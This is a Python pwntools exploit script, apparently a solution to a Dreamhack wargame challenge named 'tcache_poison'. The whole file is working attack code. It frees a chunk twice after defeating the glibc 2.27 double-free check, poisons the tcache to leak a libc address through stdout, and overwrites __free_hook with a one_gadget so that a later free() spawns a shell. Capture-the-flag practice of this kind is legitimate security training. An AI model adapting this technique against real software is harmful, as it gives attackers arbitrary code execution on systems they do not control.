# Name: Tcache Poisoning.py

from pwn import *

def slog(name,addr): success(f'{name}: {hex(addr)}')

HOST = 'host3.dreamhack.games'
PORT = 24515

p = remote(HOST,PORT) # remote
# p = process('./tcache_poison') # local
e = ELF('./tcache_poison')
libc = ELF('./libc-2.27.so')


#ifndef __Custom_Functions_For_Convenience_
#define __Custom_Functions_For_Convenience_
def alloc(size, data):
    p.sendlineafter(b'Edit\n', b'1')
    p.sendlineafter(b'Size: ', str(size).encode())
    p.sendafter(b'Content: ', data)

def free():
    p.sendlineafter(b'Edit\n', b'2')

def print():
    p.sendlineafter(b'Edit\n', b'3')

def edit(data):
    p.sendlineafter(b'Edit\n', b'4')
    p.sendafter(b'Edit chunk: ', data)
#endif /* __Custom_Functions_For_Convenience_ */

#ifndef __Global_Variables_For_Convenience_
#define __Global_Variables_For_Convenience_
dummy = b'D'
one_gadget_offset = 0x4f432
free_hook_offset = libc.symbols['__free_hook']
io_2_1_stdout = libc.symbols['_IO_2_1_stdout_']
#endif /* __Global_Variables_For_Convenience_ */

# Initial tcache is empty.
# tcache[0x40]: empty

# tcache[0x40]: Chunk A
alloc(0x30, b'dobby is free') # Allocate Chunk A
free() # tcache[0x40].append(Chunk A)

# tcache[0x40]: Chunk A -> Chunk A
edit(dummy * 8 + b'\x00') # Bypassing the DFB mitigation
free() # tcache[0x40].append(Chunk A)

# tcache[0x40]: chunk A -> stdout -> _IO_2_1_stdout_ -> ...
addr_stdout = e.symbols['stdout']
alloc(0x30, p64(addr_stdout)) # tcache[0x40].pop(); tcache[0x40].first().set_fd(addr_stdout)

# tcache[0x40]: stdout -> _IO_2_1_stdout_ -> ...
alloc(0x30, dummy) # tcache[0x40].pop()

# tcache[0x40]: _IO_2_1_stdout_ -> ...
io_2_1_stdout_lsb = p64(io_2_1_stdout)[0:1] # The least significant byte of _IO_2_1_stdout_.
                                            # This is necessary not to change the position the stdout points to.
alloc(0x30, io_2_1_stdout_lsb)  # tcache[0x40].safe_pop()

# Libc leak
print()
p.recvuntil('Content: ')
stdout = u64(p.recv(6).ljust(8, b'\x00'))
libc_base = stdout - io_2_1_stdout
free_hook = libc_base + free_hook_offset
one_gadget = libc_base + one_gadget_offset

# Logging
slog('libc base', libc_base)
slog('__free_hook', free_hook)
slog('one gadget', one_gadget)

# tcache[0x50]: empty

# tcache[0x50]: Chunk B
alloc(0x40, b'dobby is free') # Allocate Chunk B
free() # tcache[0x50].append(Chunk B)

# tcache[0x50]: Chunk B -> Chunk B
edit(dummy * 8 + b'\x00') # Bypassing the DFB mitigation
free() # tcache[0x50].append(Chunk B)

# tcache[0x50]: Chunk B -> __free_hook -> ...
alloc(0x40, p64(free_hook)) # tcache[0x50].pop(); tcache[0x50].first().set_fd(free_hook)

# tcache[0x50]: __free_hook -> ...
alloc(0x40, dummy)

# __free_hook = one_gadget
alloc(0x40, p64(one_gadget))

# call free()
free()

p.interactive()